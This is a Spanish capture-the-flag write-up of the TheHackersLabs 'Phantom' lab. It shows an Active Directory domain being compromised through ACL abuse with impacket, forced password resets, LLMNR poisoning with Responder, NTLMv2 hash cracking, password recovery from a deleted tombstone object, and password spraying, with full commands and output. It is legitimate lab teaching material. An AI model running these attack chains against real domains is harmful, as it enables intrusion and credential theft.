---
title: "TheHackersLabs: Phantom"
date: 2026-09-10T20:51:00+02:00
draft: false
description: "Compromiso completo del dominio PHANTOM.THL: abuso de ACLs mal calculadas para escalar desde un usuario inicial hasta WinRM, captura de un hash NTLMv2 mediante LLMNR Poisoning, recuperación de una contraseña en texto claro desde un objeto tombstone de Active Directory, password spraying, escalada a Administrador mediante ADCS ESC3 y persistencia final con DCSync y Golden Ticket."
tags: ["thehackerslabs", "active-directory", "llmnr-poisoning", "adcs-esc3", "golden-ticket", "acl-abuse"]
categories: ["writeups"]
sistema: ["windows","active-directory"]
dificultad: "avanzado"
---

*La máquina Phantom de TheHackersLabs simula un dominio corporativo heredero de sucesivas migraciones e improvisaciones administrativas, y su cadena de ataque nace de la acumulación de esos descuidos: permisos delegados sin control, un script de mantenimiento que nadie corrigió y una cuenta de prueba que nunca se purgó del todo. Un abuso sucesivo de ACLs mal calculadas sobre grupos y objetos permite escalar desde un usuario con permisos triviales hasta una cuenta con acceso WinRM. Desde ahí, el propio tráfico de red generado por un script mal configurado se envenena mediante LLMNR Poisoning para capturar un segundo usuario, y un objeto tombstone no depurado correctamente revela en texto claro la contraseña de un tercero, con privilegios de enrollment sobre una plantilla de certificado vulnerable a ESC3. Esa plantilla entrega un certificado válido como Administrador, y desde ahí se demuestra persistencia total e independiente del vector de entrada mediante DCSync y Golden Ticket.*

Dominio: `PHANTOM.THL`. DC: `DC01.PHANTOM.THL` (`192.168.56.100`). IP atacante: `192.168.56.2`. Las contraseñas y hashes descubiertos durante el ataque, así como las flags, se muestran ofuscados para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

## Reconocimiento — Descubrimiento de host y escaneo de puertos

Barrido de red para localizar el objetivo dentro del segmento:

<pre class="term-log">
<span class="cmd">$ nmap -sP 192.168.56.0/24</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 18:28 +0200
Nmap scan report for 192.168.56.0
Host is up (0.00031s latency).
MAC Address: 0A:00:27:00:00:39 (Unknown)
Nmap scan report for 192.168.56.1
Host is up (0.00035s latency).
MAC Address: 08:00:27:AB:52:4B (Oracle VirtualBox virtual NIC)
<span class="hl">Nmap scan report for 192.168.56.100
Host is up (0.00066s latency).
MAC Address: 08:00:27:5F:5A:A2 (Oracle VirtualBox virtual NIC)</span>
Nmap scan report for 192.168.56.2
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.05 seconds
</pre>

Con el objetivo identificado (`192.168.56.100`), se ejecuta un escaneo completo de puertos TCP con detección de servicio, versión y scripts por defecto:

<pre class="term-log">
<span class="cmd">$ nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn 192.168.56.100</span>
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 18:34 +0200
Nmap scan report for 192.168.56.100
Host is up (0.00053s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
<span class="hl">53/tcp    open  domain        Simple DNS Plus</span>
<span class="hl">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-10 16:34:36Z)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hl">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)</span>
|_ssl-date: 2026-09-10T16:36:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
<span class="hl">445/tcp   open  microsoft-ds?</span>
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
|_ssl-date: 2026-09-10T16:36:04+00:00; +2s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
|_ssl-date: 2026-09-10T16:36:04+00:00; +2s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: PHANTOM.THL, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-10T16:36:04+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=DC01.PHANTOM.THL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.PHANTOM.THL
| Not valid before: 2026-02-21T23:24:38
|_Not valid after:  2027-02-21T23:24:38
<span class="hl">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49247/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49248/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56118/tcp open  msrpc         Microsoft Windows RPC
56127/tcp open  msrpc         Microsoft Windows RPC
56142/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:5F:5A:A2 (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
<span class="hl">|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:5f:5a:a2 (Oracle VirtualBox virtual NIC)</span>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-time: 
|   date: 2026-09-10T16:35:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 121.00 seconds
</pre>

Puertos característicos de un controlador de dominio: DNS, Kerberos, LDAP/LDAPS/GC (389/636/3268/3269), SMB firmado y obligatorio, y WinRM (5985). El hostname `DC01` y el dominio `PHANTOM.THL` quedan confirmados por el certificado LDAPS y el `nbstat`. Se añade la resolución al fichero de hosts:

<pre class="term-log">
<span class="cmd">$ echo '192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL' | sudo tee -a /etc/hosts</span>
[sudo] contraseña para kali: 
192.168.56.100 PHANTOM.THL DC01.PHANTOM.THL
</pre>

### Enumeración autenticada con credenciales de partida

Con credenciales de un usuario inicial del dominio (`mark`), se enumeran los recursos SMB compartidos:

<pre class="term-log">
<span class="cmd">$ nxc smb 192.168.56.100 -u mark -p 'suP3rPa$sw0rd2026!&' --shares</span>
[*] First time use detected
[*] Creating home directory structure
[*] Initializing SMB protocol database
[*] Copying default configuration file
<span class="hl-green">SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\mark:suP3rPa$sw0rd2026!&</span> 
SMB         192.168.56.100  445    DC01             [*] Enumerated shares
SMB         192.168.56.100  445    DC01             Share           Permissions     Remark
SMB         192.168.56.100  445    DC01             -----           -----------     ------
SMB         192.168.56.100  445    DC01             ADMIN$                          Admin remota
SMB         192.168.56.100  445    DC01             C$                              Recurso predeterminado
<span class="hl">SMB         192.168.56.100  445    DC01             Dev Tools       READ,WRITE      Dev Tools</span>
SMB         192.168.56.100  445    DC01             IPC$            READ            IPC remota
SMB         192.168.56.100  445    DC01             NETLOGON        READ            Recurso compartido del servidor de inicio de sesión 
SMB         192.168.56.100  445    DC01             SYSVOL          READ            Recurso compartido del servidor de inicio de sesión 
</pre>

El recurso `Dev Tools` destaca por permitir lectura y escritura. Se conecta para inspeccionarlo, aunque en este momento está vacío:

<pre class="term-log">
<span class="cmd">$ smbclient '//192.168.56.100/Dev Tools' -U mark</span>
Password for [WORKGROUP\mark]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Sep 10 18:37:50 2026
  ..                                  D        0  Sat Feb 21 18:29:29 2026

                12935167 blocks of size 4096. 9711533 blocks available
smb: \> 
</pre>

Se enumeran los usuarios del dominio vía RPC:

<pre class="term-log">
<span class="cmd">$ rpcclient -U mark 192.168.56.100</span>
Password for [WORKGROUP\mark]:
rpcclient $> enumdomusers
user:[Administrador] rid:[0x1f4]
user:[Invitado] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[mark] rid:[0x44f]
user:[bob] rid:[0x450]
user:[joe] rid:[0x451]
user:[mia] rid:[0x452]
user:[sandra] rid:[0x453]
user:[maria] rid:[0x454]
user:[ana] rid:[0x455]
user:[michael] rid:[0x456]
user:[ian] rid:[0x457]
user:[joshua] rid:[0x458]
user:[frank] rid:[0x459]
<span class="hl">user:[tomas] rid:[0x45b]
user:[robert] rid:[0x45c]</span>
<span class="hl">user:[LegacyAdmins] rid:[0x464]</span>
rpcclient $> 
</pre>

Diecisiete usuarios y un objeto con nombre sugerente, `LegacyAdmins`. Se consulta directamente por LDAP:

<pre class="term-log">
<span class="cmd">$ ldapsearch -x -H ldap://192.168.56.100 -D 'mark@PHANTOM.THL' -w 'suP3rPa$sw0rd2026!&' -b "DC=PHANTOM,DC=THL" "(cn=LegacyAdmins)"</span>
# extended LDIF
#
# LDAPv3
# base <DC=PHANTOM,DC=THL> with scope subtree
# filter: (cn=LegacyAdmins)
# requesting: ALL
#

# LegacyAdmins, Users, PHANTOM.THL
dn: CN=LegacyAdmins,CN=Users,DC=PHANTOM,DC=THL
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: LegacyAdmins
<span class="hl">description: Legacy administrative group maintained for backward compatibility
  with older systems.</span>
givenName: LegacyAdmins
distinguishedName: CN=LegacyAdmins,CN=Users,DC=PHANTOM,DC=THL
instanceType: 4
sAMAccountName: LegacyAdmins
sAMAccountType: 805306368
userPrincipalName: LegacyAdmins@PHANTOM.THL
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PHANTOM,DC=THL

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
</pre>

`LegacyAdmins` resulta ser en realidad un objeto de tipo `user`, no un grupo, pese al nombre. Se consulta el listado completo de usuarios con sus descripciones:

<pre class="term-log">
<span class="cmd">$ ldapsearch -x -H ldap://192.168.56.100 -D 'mark@PHANTOM.THL' -w 'suP3rPa$sw0rd2026!&' -b "DC=PHANTOM,DC=THL" "(objectClass=user)" sAMAccountName description info</span>
# extended LDIF
#
# LDAPv3
# base <DC=PHANTOM,DC=THL> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName description info 
#

# Administrador, Users, PHANTOM.THL
dn: CN=Administrador,CN=Users,DC=PHANTOM,DC=THL
sAMAccountName: Administrador

[...]

# search result
search: 2
result: 0 Success

# numResponses: 22
# numEntries: 18
# numReferences: 3
</pre>

Ninguna otra cuenta expone información sensible en `description` o `info` en este punto. Se ejecuta una recolección completa con BloodHound para mapear relaciones y permisos:

<pre class="term-log">
<span class="cmd">$ bloodhound-python -u mark -p 'suP3rPa$sw0rd2026!&' -d PHANTOM.THL -ns 192.168.56.100 -c All --zip</span>
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: phantom.thl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.phantom.thl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 18 users
INFO: Found 60 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.PHANTOM.THL
INFO: Done in 00M 05S
INFO: Compressing output into 20260910185401_bloodhound.zip

<span class="cmd">$ unzip 20260910185401_bloodhound.zip</span>
Archive:  20260910185401_bloodhound.zip
 extracting: 20260910185401_containers.json  
 extracting: 20260910185401_ous.json  
 extracting: 20260910185401_groups.json  
 extracting: 20260910185401_domains.json  
 extracting: 20260910185401_users.json  
 extracting: 20260910185401_gpos.json  
 extracting: 20260910185401_computers.json
</pre>

Se filtran del JSON de grupos las ACEs no heredadas (`IsInherited: false`), que suelen señalar permisos configurados manualmente y, por tanto, más propensos a errores:

<pre class="term-log">
<span class="cmd">$ python3 -m json.tool 20260910185401_groups.json | grep -B20 '"IsInherited": false' | grep -E '"name"|RightName|PrincipalSID'</span>
                "name": "HELPDESK@PHANTOM.THL",
                    "RightName": "Owns",
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-512",
                    "RightName": "WriteDacl",
<span class="hl">                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-1117",
                    "RightName": "GenericAll",</span>
                "name": "DEVOPS@PHANTOM.THL",
                    "RightName": "Owns",
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-512",
                    "RightName": "GenericAll",
                "name": "SUPPORT@PHANTOM.THL",
                    "RightName": "Owns",
<span class="hl">                "name": "IT@PHANTOM.THL",
                    "RightName": "Owns",
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-512",
                    "RightName": "GenericWrite",
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-1104",
                    "RightName": "AddSelf",
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-1104",
                    "RightName": "GenericAll",</span>
                    "PrincipalSID": "S-1-5-21-3580157585-956322742-780763674-512",
                    "RightName": "GenericAll",
</pre>

Los grupos `HELPDESK` e `IT` muestran ACEs anómalas: un principal (SID `-1117`) tiene `GenericAll` sobre `HELPDESK`, y otro principal (SID `-1104`) tiene `AddSelf` y `GenericAll` sobre `IT`. Estas relaciones se confirman como el punto de apoyo para la fase de acceso inicial.

## Acceso inicial — Abuso de ACLs encadenadas

El SID `-1104` con `AddSelf`/`GenericAll` sobre `IT` corresponde al usuario `bob`. El primer paso es tomar control de su cuenta abusando de una ACL sobre su propio objeto, cuyo propietario legítimo es `Admins. del dominio`:

<pre class="term-log">
<span class="cmd">$ impacket-owneredit -action write -new-owner 'mark' -target 'bob' 'PHANTOM.THL/mark:suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-3580157585-956322742-780763674-512
[*] - sAMAccountName: Admins. del dominio
[*] - distinguishedName: CN=Admins. del dominio,CN=Users,DC=PHANTOM,DC=THL
<span class="hl-green">[*] OwnerSid modified successfully!</span>
</pre>

Con `mark` como nuevo propietario del objeto `bob`, se concede a `mark` control total sobre él:

<pre class="term-log">
<span class="cmd">$ impacket-dacledit -action write -rights FullControl -principal mark -target bob 'PHANTOM.THL/mark:suP3rPa$sw0rd2026!&' -dc-ip 192.168.56.100</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260910-191427.bak
<span class="hl-green">[*] DACL modified successfully!</span>
</pre>

Con `FullControl` sobre `bob`, se resetea su contraseña sin necesidad de conocer la anterior:

<pre class="term-log">
<span class="cmd">$ net rpc password bob 'NuevaPass2026!&' -U 'PHANTOM.THL/mark%suP3rPa$sw0rd2026!&' -S 192.168.56.100</span>
</pre>

<pre class="term-log">
<span class="cmd">$ nxc smb 192.168.56.100 -u bob -p 'NuevaPass2026!&'</span>
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
<span class="hl-green">SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\bob:NuevaPass2026!&</span> 
</pre>

Ya autenticado como `bob`, se abusa del privilegio `AddSelf` detectado en BloodHound para incorporarse al grupo `IT`:

<pre class="term-log">
<span class="cmd">$ net rpc group addmem "IT" bob -U 'PHANTOM.THL/bob%NuevaPass2026!&' -S 192.168.56.100</span>
</pre>

<pre class="term-log">
<span class="cmd">$ net rpc group members "IT" -U 'PHANTOM.THL/mark%suP3rPa$sw0rd2026!&' -S 192.168.56.100</span>
<span class="hl-green">PHANTOM\bob</span>
</pre>

La pertenencia a `IT` hereda el `GenericAll` que ese grupo tiene sobre `HELPDESK` (visto también en la enumeración de BloodHound). Se aprovecha para tomar control del grupo `HelpDesk`:

<pre class="term-log">
<span class="cmd">$ impacket-dacledit -action write -rights FullControl -principal bob -target HelpDesk 'PHANTOM.THL/bob:NuevaPass2026!&' -dc-ip 192.168.56.100</span>
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260910-191825.bak
<span class="hl-green">[*] DACL modified successfully!</span>
</pre>

<pre class="term-log">
<span class="cmd">$ net rpc group addmem "HelpDesk" bob -U 'PHANTOM.THL/bob%NuevaPass2026!&' -S 192.168.56.100</span>
</pre>

<pre class="term-log">
<span class="cmd">$ net rpc group members "HelpDesk" -U 'PHANTOM.THL/mark%suP3rPa$sw0rd2026!&' -S 192.168.56.100</span>
<span class="hl-green">PHANTOM\bob
PHANTOM\joe
PHANTOM\mia</span>
</pre>

La pertenencia a `HelpDesk` otorga privilegios de soporte sobre otras cuentas del dominio, entre ellas `frank`. Se resetea su contraseña:

<pre class="term-log">
<span class="cmd">$ net rpc password frank 'Fr@nkR3set!2026#Secure' -U 'PHANTOM.THL/bob%NuevaPass2026!&' -S 192.168.56.100</span>
</pre>

<pre class="term-log">
<span class="cmd">$ nxc smb 192.168.56.100 -u frank -p 'Fr@nkR3set!2026#Secure'</span>
SMB         192.168.56.100  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:PHANTOM.THL) (signing:True) (SMBv1:None) (Null Auth:True)
<span class="hl-green">SMB         192.168.56.100  445    DC01             [+] PHANTOM.THL\frank:Fr@nkR3set!2026#Secure</span> 
</pre>

<pre class="term-log">
<span class="cmd">$ nxc winrm 192.168.56.100 -u frank -p 'Fr@nkR3set!2026#Secure'</span>
WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
<span class="hl-green">WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\frank:Fr@nkR3set!2026#Secure (Pwn3d!)</span>
</pre>

`frank` tiene acceso WinRM. Se abre sesión interactiva:

<pre class="term-log">
<span class="cmd">$ evil-winrm -i 192.168.56.100 -u frank -p 'Fr@nkR3set!2026#Secure'</span>

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="cmd">*Evil-WinRM* PS C:\Users\frank\Documents> whoami /all</span>

INFORMACIÓN DE USUARIO
----------------------

Nombre de usuario SID
================= ============================================
<span class="hl-green">phantom\frank     S-1-5-21-3580157585-956322742-780763674-1113</span>

INFORMACIÓN DE GRUPO
--------------------

Nombre de grupo                                                    Tipo           SID          Atributos
================================================================== ============== ============ ==========================================================================
Todos                                                              Grupo conocido S-1-1-0      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios de administración remota                          Alias          S-1-5-32-580 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Usuarios                                                   Alias          S-1-5-32-545 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso compatible con versiones anteriores de Windows 2000 Alias          S-1-5-32-554 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
BUILTIN\Acceso DCOM a Serv. de certif.                             Alias          S-1-5-32-574 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado

INFORMACIÓN DE PRIVILEGIOS
--------------------------

Nombre de privilegio          Descripción                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada

<span class="cmd">*Evil-WinRM* PS C:\Users\frank\Documents> dir C:\Users\</span>

    Directorio: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/28/2026  11:04 PM                Administrador
d-----         9/10/2026   7:24 PM                frank
d-r---         7/22/2025   5:47 PM                Public
<span class="hl">d-----         2/21/2026   6:47 PM                robert</span>
</pre>

`frank` es un usuario local sin privilegios especiales, pero el acceso WinRM abre la puerta a la siguiente fase: se observa la existencia del directorio de usuario `robert`, objetivo del movimiento lateral.

## Movimiento lateral — LLMNR Poisoning y Tombstone AD

Desde la sesión WinRM como `frank`, se lanza Responder para envenenar la resolución de nombres en el segmento y capturar hashes de autenticación NTLM:

<pre class="term-log">
<span class="cmd">$ sudo responder -I eth0</span>
[sudo] contraseña para kali: 

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.56.2]

[*] Version: Responder 3.2.2.0

[+] Listening for events...                                                                                  

[*] [MDNS] Poisoned answer sent to 192.168.56.100  for name PHANTOM.LOCAL
[*] [NBT-NS] Poisoned answer sent to 192.168.56.100 for name PHANTOM (service: File Server)
[*] [LLMNR]  Poisoned answer sent to 192.168.56.100 for name PHANTOM
<span class="hl">[SMB] NTLMv2-SSP Client   : fe80::cd51:efdf:3715:2756
[SMB] NTLMv2-SSP Username : PHANTOM.LOCAL\robert
[SMB] NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL:6662d62e43272df1:CCA5D6819DC1169C8D923949CFB77946[...]</span>
</pre>

Se detecta el patrón: peticiones repetidas a un dominio inexistente (`PHANTOM.LOCAL` en lugar de `PHANTOM.THL`), típico de un script mal configurado, capturando el hash NTLMv2 del usuario `robert`. Se guarda el hash y se crackea con John the Ripper:

<pre class="term-log">
<span class="cmd">$ echo 'robert::PHANTOM.LOCAL:6662d62e43272df1:CCA5D6819DC1169C8D923949CFB77946[...]' > robert_hash.txt</span>
</pre>

<pre class="term-log">
<span class="cmd">$ john --wordlist=/usr/share/wordlists/rockyou.txt robert_hash.txt</span>
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="hl-green">bLink1[...]         (robert)</span>     
1g 0:00:00:03 DONE (2026-09-10 19:37) 0.3105g/s 3062Kp/s 3062Kc/s 3062KC/s bLueLove..b82508
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
</pre>

Contraseña de `robert` obtenida (ofuscada). Se verifica acceso WinRM:

<pre class="term-log">
<span class="cmd">$ evil-winrm -i 192.168.56.100 -u robert -p 'bLink1[...]'</span>

Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> dir</span>

    Directorio: C:\Users\robert\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/21/2026   6:48 PM            199 connect.ps1
-a----         2/21/2026   6:48 PM            560 migration_notes.txt

<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> cat C:\Users\robert\Documents\connect.ps1</span>
$username = "PHANTOM.LOCAL\robert"
$password = "bLink1[...]"

while ($true) {
        New-SmbMapping -RemotePath "\\PHANTOM.LOCAL\Dev Tools" -Username $username -Password $password
        Start-Sleep -Seconds 60
}
</pre>

Se confirma la causa raíz del envenenamiento: un script de mapeo de recursos que referencia el dominio incorrecto (`PHANTOM.LOCAL`) en bucle cada 60 segundos, generando tráfico LLMNR/NBT-NS constantemente resoluble por un atacante en el mismo segmento. Se recupera la flag de usuario:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> type C:\Users\robert\Desktop\user.txt</span>
<span class="hl-green">40c943b496ce2ad5[...]</span>
</pre>

*(Flag ofuscada intencionadamente en este write-up.)*

Se revisa también la nota de migración dejada en el mismo directorio:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> type migration_notes.txt</span>
[OK] Verify application connectivity after the ERP migration
Validate that legacy authentication is still working for internal tools
Review Active Directory group memberships (DevOps / Support)
[OK] Confirm that backup jobs are running correctly
Check access permissions on shared resources
<span class="hl">[IMPORTANT] Remember to clean up temporary test accounts created during the migration</span>
Remove unused scripts and obsolete configurations
[OK] Verify expiration and renewal of internal certificates
Document performed steps and lessons learned from the migration
</pre>

La nota apunta directamente a cuentas de prueba temporales no depuradas correctamente tras una migración. `robert` pertenece únicamente al grupo `PHANTOM\DevOps`, sin privilegios adicionales:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> whoami /groups</span>

Nombre de grupo                                                    Tipo           SID                                          Atributos
================================================================== ============== ============================================ ==========================================================================
<span class="hl">PHANTOM\DevOps                                                     Grupo          S-1-5-21-3580157585-956322742-780763674-1123 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado</span>

<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> whoami /priv</span>

Nombre de privilegio          Descripción                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobación de recorrido             Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada
</pre>

### Recuperación de credenciales desde un objeto tombstone

En Active Directory, los objetos eliminados no se destruyen inmediatamente: quedan en estado tombstone (`isDeleted=TRUE`) durante el periodo definido por `tombstoneLifetime`, conservando gran parte de sus atributos originales. Se buscan objetos eliminados:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Property * | Format-List Name,ObjectGUID,Deleted,DistinguishedName</span>

Name              : Deleted Objects
ObjectGUID        : 63e0d32e-2125-40ad-8405-c87b353e09b9
Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=PHANTOM,DC=THL

<span class="hl">Name              : dev_test
                    DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
Deleted           : True
DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL</span>
</pre>

Se recuperan las propiedades completas del objeto eliminado `dev_test`:

<pre class="term-log">
<span class="cmd">*Evil-WinRM* PS C:\Users\robert\Documents> Get-ADObject -IncludeDeletedObjects -Filter * -Properties * | Where-Object {$_.Name -like "*dev_test*"} | Format-List *</span>

accountExpires                  : 9223372036854775807
CanonicalName                   : PHANTOM.THL/Deleted Objects/dev_test
                                  DEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
Deleted                         : True
<span class="hl-green">Description                     : f6Y%UPa6ZB[...]</span>
DisplayName                     : dev_test
DistinguishedName                : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
isDeleted                        : True
LastKnownParent                  : CN=Users,DC=PHANTOM,DC=THL
sAMAccountName                   : dev_test
userAccountControl               : 66048
userPrincipalName                : dev_test@PHANTOM.THL
PropertyCount                    : 41
</pre>

El campo `Description` contenía una contraseña en texto claro (ofuscada). Como no se sabía a qué cuenta activa pertenecía —`dev_test` es la cuenta de prueba eliminada, pero la contraseña podría reutilizarse en cualquier cuenta viva—, se ejecuta un ataque de password spraying contra el listado de usuarios ya enumerado:

<pre class="term-log">
<span class="cmd">$ cat users.txt</span>
Administrador
Invitado
krbtgt
mark
bob
joe
mia
sandra
maria
ana
michael
ian
joshua
frank
tomas
robert
</pre>

<pre class="term-log">
<span class="cmd">$ nxc winrm 192.168.56.100 -u users.txt -p 'f6Y%UPa6ZB[...]'</span>
WINRM       192.168.56.100  5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:PHANTOM.THL) 
WINRM       192.168.56.100  5985   DC01             [-] PHANTOM.THL\Administrador:f6Y%UPa6ZB[...]
WINRM       192.168.56.100  5985   DC01             [-] PHANTOM.THL\mark:f6Y%UPa6ZB[...]
WINRM       192.168.56.100  5985   DC01             [-] PHANTOM.THL\frank:f6Y%UPa6ZB[...]
<span class="hl-green">WINRM       192.168.56.100  5985   DC01             [+] PHANTOM.THL\tomas:f6Y%UPa6ZB[...] (Pwn3d!)</span>
</pre>

